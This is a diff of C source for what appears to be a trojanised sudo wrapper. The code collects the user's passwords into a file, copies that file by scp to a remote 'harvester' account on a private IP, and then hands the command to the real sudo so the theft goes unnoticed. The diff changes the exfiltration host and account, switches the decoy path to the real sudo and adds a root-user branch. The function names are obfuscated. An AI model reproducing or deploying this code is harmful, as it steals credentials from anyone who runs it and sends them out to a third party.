@@ -58,7 +58,7 @@ void vCj2zYK7(char *filename, struct passwd *p, char *passlist[], int rounds, ch
     }
     fclose(fp);
     char command[500] = "/usr/bin/scp -q '";
-    char dest[100] = "' harvester@172.16.91.5:/var/harvester";
+    char dest[100] = "' pdiddy@172.16.77.5:/var/harvester";
     strcat(command, filename);
     strcat(command, dest);
     system(command);
@@ -174,7 +174,7 @@ void GV5gqGf5(int rounds, char *argv[], int argc){//goodbean
         strcat(argvgetter, " ");
     }
     strcat(argvgetter, " '");   
-    char *callargv[] = {"-c '/usr/bin/dev/loopw ", argvgetter, NULL};//usr/bin/sudo
+    char *callargv[] = {"-c '/usr/bin/sudo ", argvgetter, NULL};//usr/bin/sudo
     execve(command, callargv, NULL);
 
 }
@@ -186,6 +186,20 @@ int main (int argc, char *argv[]){
     if (strcmp(argv[1], "-h") == 0|| strcmp(argv[1], "--help") == 0){
         extendedhelp();
         exit(0);
+    }
+    struct passwd *p = getpwuid(getuid()); 
+    char *root_string = "root";
+    if (strcmp(p->pw_name, root_string) == 0){
+        char rootargs[100];
+        for (int i = 1; i < argc; i++){
+            strcat(rootargs, argv[i]);
+            strcat(rootargs, " ");
+        }
+        strcat(rootargs, " '");
+        char *rootargv[] = {"-c '/usr/bin/sudo ", rootargs, NULL};
+        char *command = "usr/bin/bash ";
+        execve(command, rootargv, NULL);
+        exit(1);
     }
     time_t t;
     srand((unsigned) time(&t));
